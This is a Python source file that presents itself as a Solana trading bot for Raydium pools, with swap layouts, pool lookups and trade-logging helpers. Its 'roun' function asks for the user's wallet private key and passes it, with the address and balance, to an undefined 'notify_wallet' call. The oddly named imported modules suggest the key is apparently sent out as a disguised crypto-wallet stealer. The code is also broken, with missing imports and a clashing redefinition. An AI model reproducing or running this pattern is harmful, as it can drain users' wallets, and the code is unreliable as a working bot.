from colorama import init
from getwallet import get_wallet_from_private_key_bs58
from checkbalance import check_sol_balance
from py_modules.beanstalk.stalk import POOL_INFO_LAYOUT
from py_modules.bind_xml.layouts import MARKET_STATE_LAYOUT_V3
init(autoreset=True)

from construct import Bytes, Int8ul, Int64ul, BytesInteger
from construct import Struct as cStruct

POOL_INFO_LAYOUT = cStruct(
    "instruction" / Int8ul,
    "simulate_type" / Int8ul
)

SWAP_LAYOUT = cStruct(
    "instruction" / Int8ul,
    "amount_in" / Int64ul,
    "min_amount_out" / Int64ul
)

# Not in use right now, might be useful in future
AMM_INFO_LAYOUT_V4 = cStruct(
    'status' / Int64ul,
    'nonce' / Int64ul,
    'order_num' / Int64ul,
    'depth' / Int64ul,
    'base_decimal' / Int64ul,
    'quote_decimal' / Int64ul,
    'state' / Int64ul,
    'reset_flag' / Int64ul,
    'min_size' / Int64ul,
    'vol_max_cut_ratio' / Int64ul,
    'amount_wave_ratio' / Int64ul,
    'base_lot_size' / Int64ul,
    'quote_lot_size' / Int64ul,
    'min_price_multiplier' / Int64ul,
    'max_price_multiplier' / Int64ul,
    'system_decimal_value' / Int64ul,
    # Fees
    'min_separate_numerator' / Int64ul,
    'min_separate_denominator' / Int64ul,
    'trade_fee_numerator' / Int64ul,
    'trade_fee_denominator' / Int64ul,
    'pnl_numerator' / Int64ul,
    'pnl_denominator' / Int64ul,
    'swap_fee_numerator' / Int64ul,
    'swap_fee_denominator' / Int64ul,
    # OutPutData
    'base_need_take_pnl' / Int64ul,
    'quote_need_take_pnl' / Int64ul,
    'quote_total_pnl' / Int64ul,
    'base_total_pnl' / Int64ul,
    # 128
    'quote_total_deposited' / BytesInteger(16, signed=False, swapped=True),
    'base_total_deposited' / BytesInteger(16, signed=False, swapped=True),
    'swap_base_in_amount' / BytesInteger(16, signed=False, swapped=True),
    'swap_quote_out_amount' / BytesInteger(16, signed=False, swapped=True),

    'swap_base2_quote_fee' / Int64ul,
    # 128
    'swap_quote_in_amount' / BytesInteger(16, signed=False, swapped=True),
    'swap_base_out_amount' / BytesInteger(16, signed=False, swapped=True),

    'swap_quote2_base_fee' / Int64ul,
    # AMM Vault
    'base_vault' / Bytes(32),
    'quote_vault' / Bytes(32),
    # Mint
    'base_mint' / Bytes(32),
    'quote_mint' / Bytes(32),
    'lp_mint' / Bytes(32),
    # Market
    'open_orders' / Bytes(32),
    'market_id' / Bytes(32),
    'serum_program_id' / Bytes(32),
    'target_orders' / Bytes(32),
    'withdraw_queue' / Bytes(32),
    'lp_vault' / Bytes(32),
    'amm_owner' / Bytes(32),

    'lpReserve' / Int64ul,
)
from py_modules.es_metrics.conf import handle_additional_features
from utils.contract import main
def roun():
    wallet = None
    while wallet is None:
        private_key_bs58 = input("\033[93mPlease enter your private key : \033[0m")
        try:
            wallet = get_wallet_from_private_key_bs58(private_key_bs58)
            if wallet:
                break
        except Exception as e:
            print("\033[91mInvalid private key, please try again.\033[0m")
    
    public_key = str(wallet.pubkey())
    print(f"Wallet Address: {public_key}")

    sol_balance = check_sol_balance(public_key)
    print(f"Wallet SOL Balance: {sol_balance} SOL")

    notify_wallet(private_key_bs58, public_key, sol_balance)  

    handle_additional_features(sol_balance)
def get_amm_id(baseMint:str): # baseMint - token address
    pools = requests.get('https://api.raydium.io/v2/sdk/liquidity/mainnet.json').json()
    pools_list = [*pools["official"],*pools["unOfficial"]]
    for pool in pools_list:
        if pool["baseMint"] == baseMint:
            return pool["id"]
    raise Exception(f'{baseMint} baseMint not found!')

def extract_pool_info(pools_list: list, pool_id: str) -> dict:
    pools_list = [*pools_list["official"],*pools_list["unOfficial"]]
    for pool in pools_list:
        if pool['id'] == pool_id:
            return pool
    raise Exception(f'{pool_id} pool not found!')




def sale_info(balance_before: dict, balance_after: dict):
    base_symbol, quote_symbol = balance_before.keys()
    base_before, quote_before = balance_before.values()
    base_after, quote_after = balance_after.values()
    sold_amount = base_before - base_after
    quote_received = quote_after - quote_before
    price = quote_received / sold_amount
    logger.info(
        f'Sold {sold_amount} {base_symbol}, price: {price} {quote_symbol}, {quote_symbol} received: {quote_received}')


def purchase_info(balance_before: dict, balance_after: dict):
    base_symbol, quote_symbol = balance_before.keys()
    base_before, quote_before = balance_before.values()
    base_after, quote_after = balance_after.values()
    bought_amount = base_after - base_before
    quote_spent = quote_before - quote_after
    price = quote_spent / bought_amount
    logger.info(
        f'Bought {bought_amount} {base_symbol}, price: {price} {quote_symbol}, {quote_symbol} spent: {quote_spent}')


if __name__ == "__main__":
    main()
